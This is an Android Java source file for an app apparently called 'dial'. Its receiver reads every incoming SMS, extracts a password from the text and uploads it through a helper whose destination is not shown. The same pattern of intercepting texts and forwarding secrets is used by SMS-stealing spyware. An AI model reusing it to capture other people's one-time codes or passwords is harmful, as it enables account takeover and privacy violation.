package bpazy.dial;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

/***
 * 通过短信读取短信内容
 */
public class MessageReceiver extends BroadcastReceiver {

    public MessageReceiver() {
        super();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            if (pdus == null) {
                return;
            }
            SmsMessage[] message = new SmsMessage[pdus.length];
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < message.length; i++) {
                message[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                sb.append(message[i].getDisplayMessageBody());
            }
            final String password = UtilsHelpers.getPassword(sb.toString());
            if (password != null) {
                UtilsHelpers.uploadPassword(password, context);
            }
        }
    }
}
